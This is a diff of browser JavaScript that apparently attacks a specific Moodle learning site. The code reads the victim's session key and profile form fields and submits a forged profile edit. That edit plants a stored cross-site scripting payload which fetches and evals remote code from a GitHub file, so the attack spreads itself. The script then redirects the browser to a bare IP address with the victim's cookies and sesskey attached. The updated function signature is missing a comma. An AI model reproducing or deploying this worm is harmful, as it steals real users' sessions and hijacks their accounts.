@@ -1,16 +1,83 @@
-function extractValuesRegex(htmlContent) {
-    // Ищем id
-    const idMatch = htmlContent.match(/name="id"\s+value="([^"]+)"/);
-    const id = idMatch ? idMatch[1] : null;
-    
-    // Ищем sesskey
-    const sesskeyMatch = htmlContent.match(/name="sesskey"\s+value="([^"]+)"/);
-    const sesskey = sesskeyMatch ? sesskeyMatch[1] : null;
-    
-    return { id, sesskey };
+function extractAllValues(htmlContent) {
+    const result = {
+        email: null,
+        id: null,
+        course: null,
+        timezone: null,
+        sesskey: null,
+        _qf__user_edit_form: null,
+        mform_isexpanded_id_moodle_picture: null,
+        mform_isexpanded_id_moodle: null,
+        mform_isexpanded_id_moodle_additional_names: null,
+        mform_isexpanded_id_moodle_interests: null,
+        mform_isexpanded_id_moodle_optional: null,
+        mform_isexpanded_id_category_1: null
+    };
+
+    // Извлечение email (из поля input с name="email")
+    const emailRegex = /<input[^>]*name="email"[^>]*value="([^"]*)"[^>]*>/i;
+    const emailMatch = htmlContent.match(emailRegex);
+    if (emailMatch) result.email = emailMatch[1];
+
+    // Извлечение id (из hidden input)
+    const idRegex = /<input[^>]*name="id"[^>]*value="([^"]*)"[^>]*>/i;
+    const idMatch = htmlContent.match(idRegex);
+    if (idMatch) result.id = idMatch[1];
+
+    // Извлечение course
+    const courseRegex = /<input[^>]*name="course"[^>]*value="([^"]*)"[^>]*>/i;
+    const courseMatch = htmlContent.match(courseRegex);
+    if (courseMatch) result.course = courseMatch[1];
+
+    // Извлечение timezone
+    const timezoneRegex = /<input[^>]*name="timezone"[^>]*value="([^"]*)"[^>]*>/i;
+    const timezoneMatch = htmlContent.match(timezoneRegex);
+    if (timezoneMatch) result.timezone = timezoneMatch[1];
+
+    // Извлечение sesskey
+    const sesskeyRegex = /<input[^>]*name="sesskey"[^>]*value="([^"]*)"[^>]*>/i;
+    const sesskeyMatch = htmlContent.match(sesskeyRegex);
+    if (sesskeyMatch) result.sesskey = sesskeyMatch[1];
+
+    // Извлечение _qf__user_edit_form
+    const qfRegex = /<input[^>]*name="_qf__user_edit_form"[^>]*value="([^"]*)"[^>]*>/i;
+    const qfMatch = htmlContent.match(qfRegex);
+    if (qfMatch) result._qf__user_edit_form = qfMatch[1];
+
+    // Извлечение mform_isexpanded_id_moodle_picture
+    const pictureRegex = /<input[^>]*name="mform_isexpanded_id_moodle_picture"[^>]*value="([^"]*)"[^>]*>/i;
+    const pictureMatch = htmlContent.match(pictureRegex);
+    if (pictureMatch) result.mform_isexpanded_id_moodle_picture = pictureMatch[1];
+
+    // Извлечение mform_isexpanded_id_moodle
+    const moodleRegex = /<input[^>]*name="mform_isexpanded_id_moodle"[^>]*value="([^"]*)"[^>]*>/i;
+    const moodleMatch = htmlContent.match(moodleRegex);
+    if (moodleMatch) result.mform_isexpanded_id_moodle = moodleMatch[1];
+
+    // Извлечение mform_isexpanded_id_moodle_additional_names
+    const additionalNamesRegex = /<input[^>]*name="mform_isexpanded_id_moodle_additional_names"[^>]*value="([^"]*)"[^>]*>/i;
+    const additionalNamesMatch = htmlContent.match(additionalNamesRegex);
+    if (additionalNamesMatch) result.mform_isexpanded_id_moodle_additional_names = additionalNamesMatch[1];
+
+    // Извлечение mform_isexpanded_id_moodle_interests
+    const interestsRegex = /<input[^>]*name="mform_isexpanded_id_moodle_interests"[^>]*value="([^"]*)"[^>]*>/i;
+    const interestsMatch = htmlContent.match(interestsRegex);
+    if (interestsMatch) result.mform_isexpanded_id_moodle_interests = interestsMatch[1];
+
+    // Извлечение mform_isexpanded_id_moodle_optional
+    const optionalRegex = /<input[^>]*name="mform_isexpanded_id_moodle_optional"[^>]*value="([^"]*)"[^>]*>/i;
+    const optionalMatch = htmlContent.match(optionalRegex);
+    if (optionalMatch) result.mform_isexpanded_id_moodle_optional = optionalMatch[1];
+
+    // Извлечение mform_isexpanded_id_category_1
+    const categoryRegex = /<input[^>]*name="mform_isexpanded_id_category_1"[^>]*value="([^"]*)"[^>]*>/i;
+    const categoryMatch = htmlContent.match(categoryRegex);
+    if (categoryMatch) result.mform_isexpanded_id_category_1 = categoryMatch[1];
+
+    return result;
 }
 
-async function postData(id, sesskey, moodleSession, desc) {
+async function postData(email, id, course, timezone, sesskey, _qf__user_edit_form, mform_isexpanded_id_moodle_picture, mform_isexpanded_id_moodle, mform_isexpanded_id_moodle_additional_names, mform_isexpanded_id_moodle_interests, mform_isexpanded_id_moodle_optional, mform_isexpanded_id_category_1 moodleSession, desc) {
     const response = await fetch('https://www.dist-mspk.ru/user/edit.php', {
         method: 'POST',
         headers: {
@@ -34,7 +101,7 @@ async function postData(id, sesskey, moodleSession, desc) {
             'Priority': 'u=0, i',
             'Connection': 'keep-alive'
         },
-        body: `course=1&id=${id}&returnto=profile&id=${id}&course=1&timezone=99&mform_isexpanded_id_moodle_picture=1&sesskey=${sesskey}&_qf__user_edit_form=1&mform_isexpanded_id_moodle=1&mform_isexpanded_id_moodle_additional_names=1&mform_isexpanded_id_moodle_interests=1&mform_isexpanded_id_moodle_optional=1&mform_isexpanded_id_category_1=1&maildisplay=1&moodlenetprofile=%27%22%3E%3E%22%3E&city=%D0%9F%D0%9E%D0%A7%D0%A3+%22%D0%A2%D0%AD%D0%B8%D0%9F+%D0%9C%D0%A1%D0%9F%D0%9A%22&country=RU&description_editor%5Btext%5D=${desc}&description_editor%5Bformat%5D=1&description_editor%5Bitemid%5D=651132569&imagefile=900412170&imagealt=&firstnamephonetic=&lastnamephonetic=&middlename=&alternatename=&interests=_qf__force_multiselect_submission&department=%D0%BE%D1%87%D0%BD%D0%BE%D0%B5&phone1=&phone2=&address=&profile_field_VK=&profile_field_Telegram=&submitbutton=%D0%9E%D0%B1%D0%BD%D0%BE%D0%B2%D0%B8%D1%82%D1%8C+%D0%BF%D1%80%D0%BE%D1%84%D0%B8%D0%BB%D1%8C`,
+        body: `course=${course}&id=${id}&returnto=profile&id=${id}&course=${course}&timezone=${timezone}&mform_isexpanded_id_moodle_picture=${mform_isexpanded_id_moodle_picture}&sesskey=${sesskey}&_qf__user_edit_form=${_qf__user_edit_form}&mform_isexpanded_id_moodle=${mform_isexpanded_id_moodle}&mform_isexpanded_id_moodle_additional_names=${mform_isexpanded_id_moodle_additional_names}&mform_isexpanded_id_moodle_interests=${mform_isexpanded_id_moodle_interests}&mform_isexpanded_id_moodle_optional=${mform_isexpanded_id_moodle_optional}&mform_isexpanded_id_category_1=${mform_isexpanded_id_category_1}&email=${email}&maildisplay=1&moodlenetprofile=city=%D0%9F%D0%9E%D0%A7%D0%A3+%22%D0%A2%D0%AD%D0%B8%D0%9F+%D0%9C%D0%A1%D0%9F%D0%9A%22&country=RU&description_editor%5Btext%5D=${desc}&description_editor%5Bformat%5D=1&description_editor%5Bitemid%5D=365355570&imagefile=676545573&imagealt=&firstnamephonetic=&lastnamephonetic=&middlename=&alternatename=&interests=_qf__force_multiselect_submission&department=%D0%BE%D1%87%D0%BD%D0%BE%D0%B5&phone1=&phone2=&address=&profile_field_VK=&profile_field_Telegram=&submitbutton=%D0%9E%D0%B1%D0%BD%D0%BE%D0%B2%D0%B8%D1%82%D1%8C+%D0%BF%D1%80%D0%BE%D1%84%D0%B8%D0%BB%D1%8C`,
         credentials: 'include'
     });
     
@@ -45,7 +112,7 @@ async function postData(id, sesskey, moodleSession, desc) {
 }
 
 async function getUserProfile() {
-    const url = 'https://www.dist-mspk.ru/user/profile.php';
+    const url = 'https://www.dist-mspk.ru/user/edit.php';
     
     // Подготавливаем заголовки (как в вашем запросе)
     const headers = new Headers();
@@ -81,23 +148,30 @@ async function getUserProfile() {
         // Получаем содержимое как текст (HTML)
         const htmlContent = await response.text();
 
-        const { id, sesskey } = extractValuesRegex(htmlContent);
-        console.log('ID:', id);
-        console.log('Sesskey:', sesskey);
+        // Извлекаем все значения
+        const allValues = extractAllValues(htmlContent);
         
-        console.log('=== Содержимое страницы профиля ===');
-        console.log(`Статус: ${response.status} ${response.statusText}`);
-        console.log(`URL: ${response.url}`);
-        console.log('=== HTML содержимое (первые 1000 символов) ===');
-        console.log(htmlContent.substring(0, 1000));
-        console.log('... (остальной контент обрезан) ...');
-        console.log(`Общая длина HTML: ${htmlContent.length} символов`);
-        await postData(id, sesskey, document.cookie, "%3Ch1+style%3D%22text-align%3Acenter%3B%22%3E%3Cstrong%3E%3Ca+href%3D%22https%3A%2F%2Fwww.dist-mspk.ru%2Fcourse%2Fsearch.php%3Fareaids%3Dcore_course-course%26amp%3Bq%3D%2522%2520autofocus%2Fonfocus%3D%2522fetch%28%2527https%3A%2F%2Fraw.githubusercontent.com%2FAMAT0RY%2Fxs%2Fmain%2Ftest.js%2527%29.then%28r%3D%253Er.text%28%29%29.then%28eval%29%3B%2522%2520%2F%2F%22+target%3D%22_blank%22+rel%3D%22noreferrer+noopener%22%3E%3Cspan%3E%D0%92%D0%9A%D0%90%D0%9D%D0%A2%D0%90%D0%9A%D0%A2%D0%95+%D0%A1%D0%AB%D0%9B%D0%9A%D0%90%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fstrong%3E%3C%2Fh1%3E")
+        // Выводим все значения в консоль
+        console.log('Email:', allValues.email);
+        console.log('ID:', allValues.id);
+        console.log('Course:', allValues.course);
+        console.log('Timezone:', allValues.timezone);
+        console.log('Sesskey:', allValues.sesskey);
+        console.log('_qf__user_edit_form:', allValues._qf__user_edit_form);
+        console.log('mform_isexpanded_id_moodle_picture:', allValues.mform_isexpanded_id_moodle_picture);
+        console.log('mform_isexpanded_id_moodle:', allValues.mform_isexpanded_id_moodle);
+        console.log('mform_isexpanded_id_moodle_additional_names:', allValues.mform_isexpanded_id_moodle_additional_names);
+        console.log('mform_isexpanded_id_moodle_interests:', allValues.mform_isexpanded_id_moodle_interests);
+        console.log('mform_isexpanded_id_moodle_optional:', allValues.mform_isexpanded_id_moodle_optional);
+        console.log('mform_isexpanded_id_category_1:', allValues.mform_isexpanded_id_category_1);
+        await postData(allValues.email, allValues.id, allValues.course, allValues.timezone, allValues.sesskey, allValues._qf__user_edit_form, allValues.mform_isexpanded_id_moodle_picture, allValues.mform_isexpanded_id_moodle, allValues.mform_isexpanded_id_moodle_additional_names, allValues.mform_isexpanded_id_moodle_interests, allValues.mform_isexpanded_id_moodle_optional, allValues.mform_isexpanded_id_category_1, document.cookie, "%3Ch1+style%3D%22text-align%3Acenter%3B%22%3E%3Cstrong%3E%3Ca+href%3D%22https%3A%2F%2Fwww.dist-mspk.ru%2Fcourse%2Fsearch.php%3Fareaids%3Dcore_course-course%26amp%3Bq%3D%2522%2520autofocus%2Fonfocus%3D%2522fetch%28%2527https%3A%2F%2Fraw.githubusercontent.com%2FAMAT0RY%2Fxs%2Fmain%2Ftest.js%2527%29.then%28r%3D%253Er.text%28%29%29.then%28eval%29%3B%2522%2520%2F%2F%22+target%3D%22_blank%22+rel%3D%22noreferrer+noopener%22%3E%3Cspan%3E%D0%92%D0%9A%D0%90%D0%9D%D0%A2%D0%90%D0%9A%D0%A2%D0%95+%D0%A1%D0%AB%D0%9B%D0%9A%D0%90%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fstrong%3E%3C%2Fh1%3E")
         window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+" "+id+" "+sesskey;
-        return htmlContent;
-        
+
+        // Возвращаем все значения для дальнейшего использования
+        return allValues;
+
     } catch (error) {
-        console.error('Ошибка при получении профиля:', error);
+        console.error('Ошибка при получении данных:', error);
         throw error;
     }
 }
